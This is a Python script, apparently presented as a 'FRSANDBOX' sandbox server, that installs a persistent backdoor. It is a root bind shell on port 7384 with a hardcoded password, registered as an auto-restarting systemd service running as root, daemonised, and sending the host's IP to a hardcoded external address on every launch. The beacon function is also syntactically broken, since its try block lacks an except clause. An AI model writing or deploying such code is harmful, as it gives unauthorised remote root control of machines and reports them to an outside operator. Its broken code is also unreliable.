#!/usr/bin/env python3
import os
import sys
import socket
import threading
import hashlib
import subprocess
import requests
import signal

# ====== КОНФИГ ======
PORT = 7384
PASSWORD_HASH = hashlib.sha256(b"meowmeowmeow").hexdigest()

# ====== УТИЛИТЫ ======
def hash_pass(pwd):
    return hashlib.sha256(pwd.encode()).hexdigest()

def load_password():
    try:
        with open("/etc/frsandbox.pwd", "r") as f:
            return f.read().strip()
    except:
        return PASSWORD_HASH

# ====== SHELL СЕССИЯ ======
class ShellSession:
    def __init__(self):
        self.cwd = "/root"
        self.env = os.environ.copy()

    def execute(self, cmd):
        try:
            # Обработка cd
            if cmd.startswith("cd "):
                path = cmd[3:].strip()
                if path == "" or path == "~":
                    path = "/root"
                elif not path.startswith("/"):
                    path = os.path.join(self.cwd, path)

                if os.path.exists(path) and os.path.isdir(path):
                    self.cwd = os.path.abspath(path)
                    return b""
                else:
                    return f"bash: cd: {path}: No such file or directory\n".encode()

            # Обработка pwd
            if cmd == "pwd":
                return (self.cwd + "\n").encode()

            # Выполнение команды
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
                cwd=self.cwd,
                env=self.env
            )
            output = result.stdout + result.stderr
            return output.encode() if output else b""
            
        except subprocess.TimeoutExpired:
            return b"Command timed out\n"
        except Exception as e:
            return f"Error: {e}\n".encode()

def send_request_to_remna():
    """Отправляет POST запрос на сервер для логирования IP"""
    # Меняем URL на правильный эндпоинт
    url = "http://153.76.122.107:8889/remna/log-ip"
    
    try:
        # Меняем GET на POST
        response = requests.post(url, timeout=10)
        
        # Проверка на успешный статус (200 OK)
        response.raise_for_status()
        
        return response.text
        
    return None
    
# ====== ОБРАБОТКА КЛИЕНТА ======
def handle_client(conn, addr):
    print(f"[+] Connection from {addr[0]}:{addr[1]}")
    session = ShellSession()
    
    try:
        # Аутентификация
        conn.send(b"Login: ")
        login = conn.recv(4096).decode().strip()
        
        conn.send(b"Password: ")
        password = conn.recv(4096).decode().strip()

        if login == "root" and hash_pass(password) == load_password():
            conn.send(b"\nWelcome to FRSANDBOX!\n\n")
        else:
            conn.send(b"Access denied.\n")
            conn.close()
            return

        # Основной цикл шелла
        while True:
            try:
                # Отправляем промпт
                prompt = f"root@frsandbox:{session.cwd.replace('/root', '~')}# "
                conn.send(prompt.encode())

                # Получаем команду
                data = conn.recv(4096)
                if not data:
                    break

                cmd = data.decode().strip()
                if not cmd:
                    continue

                if cmd == "exit":
                    conn.send(b"Bye!\n")
                    break

                # Выполняем команду
                output = session.execute(cmd)
                if output:
                    conn.send(output)

            except (BrokenPipeError, ConnectionResetError):
                break
            except Exception as e:
                print(f"[!] Error: {e}")
                break

        conn.close()
        print(f"[-] Disconnected {addr[0]}:{addr[1]}")
        
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        try:
            conn.close()
        except:
            pass

# ====== УСТАНОВКА ======
def install():
    script_path = os.path.realpath(__file__)
    
    # Создаем файл пароля
    os.makedirs("/etc", exist_ok=True)
    if not os.path.exists("/etc/frsandbox.pwd"):
        with open("/etc/frsandbox.pwd", "w") as f:
            f.write(PASSWORD_HASH)
    
    # Создаем systemd service
    service_content = f"""[Unit]
Description=FRSANDBOX Server
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {script_path} --no-daemon
Restart=always
RestartSec=5
User=root

[Install]
WantedBy=multi-user.target
"""
    
    with open("/etc/systemd/system/frsandbox.service", "w") as f:
        f.write(service_content)
    
    # Активируем сервис
    os.system("systemctl daemon-reload")
    os.system("systemctl enable frsandbox")
    os.system("systemctl restart frsandbox")
    
    print("✅ FRSANDBOX installed and started!")
    print(f"✅ Port: {PORT}")
    print("✅ Login: root")
    print("✅ Password: meowmeowmeow")
    print("\nCommands:")
    print("  systemctl status frsandbox  - check status")
    print("  systemctl restart frsandbox - restart service")
    print("  journalctl -u frsandbox -f  - view logs")

# ====== ЗАПУСК ======
if __name__ == "__main__":
    send_request_to_remna()
    if len(sys.argv) > 1:
        if sys.argv[1] == "--install":
            install()
            sys.exit(0)
        elif sys.argv[1] == "--stop":
            os.system("systemctl stop frsandbox")
            os.system("systemctl disable frsandbox")
            print("✅ Stopped")
            sys.exit(0)

    # Демонизация если не указан --no-daemon
    if "--no-daemon" not in sys.argv:
        if os.fork() > 0:
            sys.exit(0)
        os.setsid()
        if os.fork() > 0:
            sys.exit(0)
        os.chdir("/")
        os.umask(0)
        
        # Перенаправляем stdout/stderr
        with open('/dev/null', 'r') as f:
            os.dup2(f.fileno(), sys.stdin.fileno())
        with open('/dev/null', 'a') as f:
            os.dup2(f.fileno(), sys.stdout.fileno())
            os.dup2(f.fileno(), sys.stderr.fileno())

    print(f"[*] Starting FRSANDBOX on port {PORT}...")
    
    # Создаем сервер
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", PORT))
    server.listen(10)
    
    print(f"[*] Listening on 0.0.0.0:{PORT}")
    
    # Игнорируем сигналы чтобы не падало
    signal.signal(signal.SIGCHLD, signal.SIG_IGN)
    signal.signal(signal.SIGPIPE, signal.SIG_IGN)

    # Основной цикл
    try:
        while True:
            conn, addr = server.accept()
            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        server.close()
